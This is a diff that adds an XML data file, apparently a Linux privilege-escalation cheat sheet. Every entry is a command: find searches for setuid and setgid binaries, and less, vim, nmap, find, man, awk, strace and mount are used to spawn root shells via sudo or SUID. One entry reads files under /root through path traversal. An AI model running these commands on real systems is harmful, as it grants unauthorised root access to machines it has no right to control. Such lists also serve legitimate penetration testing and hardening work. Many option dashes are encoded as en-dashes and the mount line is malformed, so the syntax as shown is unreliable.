@@ -1,0 +1,61 @@
+<DATA>
+    <SUID-SGID>
+        <TITLE>SHOW</TITLE>
+        <CONTENT>find / &#8211;perm &#8211;g=s &#8211;o &#8211;perm &#8211;4000 ! &#8211;type l &#8211;maxdepth 3 &#8211;exec ls &#8211;ld {} \; 2&#62;/dev/null</CONTENT>
+        <TITLE>SHOW/SUID (ROOT)</TITLE>
+        <CONTENT>find / &#8211;user root &#8211;perm &#8211;4000 &#8211;print 2&#62;/dev/null</CONTENT>
+        <TITLE>SHOW/SUID (USER)</TITLE>
+        <CONTENT>find / &#8211;perm &#8211;u=s &#8211;type f 2&#62;/dev/null</CONTENT>
+        <TITLE>SHOW/SUID (GROUP)</TITLE>
+        <CONTENT>find / &#8211;perm &#8211;g=s &#8211;type f 2&#62;/dev/null</CONTENT>
+        <TITLE>RUN/BASH</TITLE>
+        <CONTENT>bash -p</CONTENT>
+        <TITLE>RUN/LESS</TITLE>
+        <CONTENT>
+            less &#60;FILE&#62;
+            !/bin/sh
+        </CONTENT>
+        <TITLE>RUN/FIND</TITLE>
+        <CONTENT>find &#60;FILE&#62; &#8211;exec /bin/sh \;</CONTENT>
+        <TITLE>RUN/NMAP</TITLE>
+        <CONTENT>
+            nmap &#8211;&#8211;interactive
+            !sh
+        </CONTENT>
+        <TITLE>RUN/VIM</TITLE>
+        <CONTENT>
+            vim
+            :set shell=/bin/sh
+            :shell
+        </CONTENT>
+    </SUID-SGID>
+    <SUDO>
+        <TITLE>SHOW</TITLE>
+        <CONTENT>sudo &#8211;l</CONTENT>
+        <TITLE>RUN/LESS</TITLE>
+        <CONTENT>
+            sudo less &#60;FILE&#62;
+            !/bin/sh
+        </CONTENT>
+        <TITLE>RUN/MORE</TITLE>
+        <CONTENT>
+            sudo more &#60;FILE&#62;
+            !/bin/sh
+        </CONTENT>
+        <TITLE>RUN/FIND</TITLE>
+        <CONTENT>sudo find &#60;FILE&#62; &#8211;exec /bin/sh \;</CONTENT>
+        <TITLE>RUN/CAT</TITLE>
+        <CONTENT>sudo /bin/cat /&#60;DIR&#62;/../root/&#60;FILE&#62;</CONTENT>
+        <TITLE>RUN/MAN</TITLE>
+        <CONTENT>
+            sudo man man
+            !sh
+        </CONTENT>
+        <TITLE>RUN/MOUNT</TITLE>
+        <CONTENT>sudo mount &#8211;o bind /bin/sh /bin/mount sudo mount</CONTENT>
+        <TITLE>RUN/STRACE</TITLE>
+        <CONTENT>sudo strace &#8211;o/dev/null /bin/sh</CONTENT>
+        <TITLE>RUN/AWK</TITLE>
+        <CONTENT>sudo awk &#39;BEGIN {system(&#34;/bin/sh&#34;)}&#39;</CONTENT>
+    </SUDO>
+</DATA>
